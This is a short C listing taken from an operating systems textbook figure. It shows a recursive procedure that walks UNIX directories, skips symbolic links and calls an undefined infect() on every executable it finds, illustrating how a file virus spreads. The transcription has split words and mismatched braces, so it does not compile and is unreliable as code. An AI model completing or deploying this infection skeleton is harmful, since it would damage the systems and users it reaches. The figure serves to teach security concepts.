
// Figure 9-28. A recursive procedure that finds executable files on a UNIX system

#include <sys/types.h>                       /* standard POSIX headers */
#include <sys/stat.h> 
#include <dirent.h> 
#include <fcntl.h> 
#include <unistd.h>                          /* for lstat call to see if file is sym link */

struct stat sbuf;

search(char *dir_name) {                     /* recursively search for executables */
    DIR *dirp;                               /* pointer to an open director y stream */
    struct dirent *dp;                       /* pointer to a directory entry */

    dirp = opendir(dir_name);                /* open this director y */
    if (dirp == NULL)                        /* dir could not be opened; forget it */
        return; 
    while (TRUE) {
        dp = readdir(dirp);                  /* read next directory entry */ 
        if (dp == NULL) {                    /* NULL means we are done */ 
        chdir("..");                         /* go back to parent directory */ 
        break;                               /* exit loop */
    }

    if (dp->d_name[0] == '.')                /* skip the . and .. directories */
        continue; 
    lstat(dp->d_name, &sbuf);                /* is entry a symbolic link? */
    if (S_ISLNK(sbuf.st_mode))               /* skip symbolic links */ 
        continue; 
    if (chdir(dp->d_name) == 0) {            /* if chdir succeeds, it must be a dir */ 
        search(".");                         /* yes, enter and search it */
    } else {                                 /* no (file), infect it */
        if (access(dp->d_name, X_OK) == 0)   /* if executable, infect it */
            infect(dp->d_name);
    }
    closedir(dir p);                         /* dir processed; close and retur n */
}